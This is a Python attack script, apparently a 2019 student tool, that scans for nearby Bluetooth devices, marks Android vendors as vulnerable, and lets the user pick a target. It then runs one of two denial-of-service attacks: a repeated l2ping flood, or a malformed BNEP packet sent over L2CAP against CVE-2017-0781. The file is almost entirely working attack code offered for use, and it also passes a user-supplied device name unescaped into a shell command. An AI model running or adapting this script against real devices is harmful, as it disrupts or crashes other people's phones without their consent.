# -------------------------------------------------------------------------------------------------------------------------------------------------------------
# Deauthentication Attack for bluetooth
# @Authors:  Authors: Shir, Hodaya and Alexey
# @Version: 1.0
# @Date 07.2019
# -------------------------------------------------------------------------------------------------------------------------------------------------------------
from classes.deviceslist import devices
from classes import wcolors
from prettytable import PrettyTable
from bluetooth import *
from pwn import *
import argparse
import os
import sys
import subprocess
from time import sleep

# global variables
amount = 30                                 # Amount of packets to send
devicelookup = devices.get_devices()        # list of devices according to manufacturer
port = 0xf                                  # BT_PSM_BNEP
context.arch = 'arm'
BNEP_FRAME_CONTROL = 0x01
BNEP_SETUP_CONNECTION_REQUEST_MSG = 0x01


# function search manufacturer of device
def is_device_vulnerable(addr):
    manufacturers = devicelookup["ANDROIDS"]
    for manufacturer in manufacturers:
        # search manufacturer
        lookups = manufacturers[manufacturer]
        for address in lookups:
            if (address == addr[:8]):                       # first 4 bytes of bluetooth address
                return True, str(manufacturer)
    return False, 'Don\'t know'


# function that scans bluetooth devices
def FindDevices(_duration):
    # use table to display devices
    BTable = PrettyTable(['Index', 'Bluetooth Address', 'Bluetooth Name', 'Manufacturer', 'Vulnerable'])
    nearby_devices = discover_devices(duration = _duration)
    addresses = []
    for (i, address) in enumerate(nearby_devices):
        vulnerable, company = is_device_vulnerable(address)
        addresses.append(address)
        if (vulnerable):
            BTable.add_row([str(i+1), address, lookup_name(address), company, 'Yes'])
        else:
            BTable.add_row([str(i+1), address, lookup_name(address), company, 'None'])
    print BTable
    return addresses

# function use l2ping for Deauthentication Attack
def l2pingFun(hciX, size, bd_addr):
    print(wcolors.color.BLUE + "[*] Bluetooth Ping Of Death Attack Started ..." + wcolors.color.ENDC)
    try:
        for i in range(1, 10000):
            xterm_1 = "l2ping -i %s -s %s -f %s" % (hciX, size, bd_addr)
            subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            sleep(3)
    except(KeyboardInterrupt, OSError):
        print(wcolors.color.RED + "[!] Something Is Wrong ! DeAuth Exit." + wcolors.color.ENDC)


def set_bnep_header_extension_bit(bnep_header_type):
    """
    If the extension flag is equal to 0x1 then
    one or more extension headers follows the BNEP
    header; If extension flag is equal to 0x0 then the
    BNEP payload follows the BNEP header.
    """
    return bnep_header_type | 128

def bnep_control_packet(control_type, control_packet):
    return p8(control_type) + control_packet

def packet(overflow):
    pkt = ''
    pkt += p8(set_bnep_header_extension_bit(BNEP_FRAME_CONTROL))
    pkt += bnep_control_packet(BNEP_SETUP_CONNECTION_REQUEST_MSG, '\x00' + overflow)
    return pkt

# function use CVE-2017-0781 vulnerable for Deauthentication Attack
def CVE_2017_0781(target, count):
    print(wcolors.color.BLUE + "[*] Bluetooth Ping Of Death Attack Started ..." + wcolors.color.ENDC)
    bad_packet = packet('AAAABBBB')
    log.info(wcolors.color.BLUE + 'Connecting...' + wcolors.color.ENDC)
    sock = BluetoothSocket(L2CAP)
    set_l2cap_mtu(sock, 1500)
    sock.connect((target, port))

    log.info(wcolors.color.BLUE + 'Sending BNEP packets...' + wcolors.color.ENDC)
    try:
        for i in range(count):
            sock.send(bad_packet)

    except(KeyboardInterrupt, OSError):
        print(wcolors.color.RED + "[!] Something Is Wrong ! DeAuth Exit." + wcolors.color.ENDC)

    log.success(wcolors.color.BLUE + 'Done.' + wcolors.color.ENDC)
    sock.close()

if __name__ == "__main__":
    # construct the argument and parse the arguments
    ap = argparse.ArgumentParser()
    ap.add_argument("-d", "--duration", type = int, default = 3,
                    help="duration for finding bluetooth devices command")
    ap.add_argument("-s", "--size", type = int, default = 600,
                    help="the size of the data packets to be sent")
    ap.add_argument("-n", "--name", type = str, default = 'BT_Ariel',
                    help="bluetooth broadcast device name")
    args = vars(ap.parse_args())
    # to change Bluetooth broadcast device name?
    change_dn = "hciconfig hci0 name " + args["name"]
    subprocess.Popen(change_dn, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    # scan devices
    addresses = FindDevices(args["duration"])
    
    print(wcolors.color.GREEN + "Choose Death Attack : 1 - l2ping   2 - CVE-2017-0781" + wcolors.color.ENDC)
    ap_choice = input()
    if (ap_choice == 1):
        print(wcolors.color.GREEN + "Choose BDDR by Index" + wcolors.color.ENDC)
        device_choice = input()
        device_choice = device_choice-1
        if (type(device_choice) == type(amount) and device_choice < len(addresses) and device_choice > -1): 
            l2pingFun('hci0', args["size"], addresses[device_choice])
        else:
            print(wcolors.color.RED + "[!] Something Is Wrong ! DeAuth Exit." + wcolors.color.ENDC)
            exit(1)
    elif (ap_choice == 2):
        print(wcolors.color.GREEN + "Choose BDDR by Index" + wcolors.color.ENDC)
        device_choice = input()
        device_choice = device_choice-1
        if (type(device_choice) == type(amount) and device_choice < len(addresses) and device_choice > -1): 
            CVE_2017_0781(addresses[device_choice], amount)
        else:
            print(wcolors.color.RED + "[!] Something Is Wrong ! DeAuth Exit." + wcolors.color.ENDC)
            exit(1)
    else:
        print(wcolors.color.RED + "[!] Something Is Wrong ! DeAuth Exit." + wcolors.color.ENDC)
        exit(1)
    
    print ("\n\x1b[1;35m                             ")
    print ("    _    (^)                             ")
    print ("   (_\   |_|                             ")
    print ("    \_\  |_|                             ")
    print ("    _\_\,/_|                             ")
    print ("   (`\(_|`\|                             ")
    print ("  (`\,)  \ \'                            ")
    print ("   \,)   | |                             ")
    print ("     \__(__|\x1b[0m                      ")
    print ("                                         ")
    print ("\x1b[1;35m        Peace brothers and sisters!       ")
    print ("\n                                       ")
